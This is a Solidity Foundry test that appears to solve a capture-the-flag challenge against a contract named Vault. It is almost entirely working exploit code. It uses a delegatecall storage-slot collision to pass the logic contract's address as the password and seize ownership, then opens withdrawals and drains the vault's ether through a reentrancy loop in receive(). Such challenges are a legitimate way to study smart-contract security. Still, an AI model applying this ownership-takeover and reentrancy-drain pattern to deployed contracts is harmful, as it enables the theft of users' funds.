import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    address owner = address(1);
    address palyer = address(this);
    bool start_attack = false;
    
    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.startPrank(owner);
        bytes32 setupPassword = bytes32("0x1234");
        logic = new VaultLogic(setupPassword);
        vault = new Vault(address(logic));
        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }
    
    function testExploit() public {
        // 1. Fund our exploiter contract
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        
        // 2. Key insight: When doing delegatecall, storage slots align:
        // VaultLogic's password slot maps to Vault's logic address slot
        // So the password value is actually the logic contract's address!
        bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)"));
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        bytes memory callData = abi.encodePacked(selector, password, uint256(uint160(palyer)));
        
        // 3. Change owner using the logic contract's address as the password
        (bool success,) = address(vault).call(callData);
        assertEq(vault.owner(), palyer);
        
        // 4. Enable withdrawals now that we're owner
        vault.openWithdraw();
        
        // 5. Set up reentrancy attack
        start_attack = true;
        vault.deposite{value: 0.01 ether}();
        
        // 6. Initial withdraw triggers reentrancy through receive()
        vault.withdraw();
        
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
    
    // 7. Reentrancy handler to drain the vault
    receive() external payable {
        if (start_attack) {
            vault.withdraw();
        }
    }
}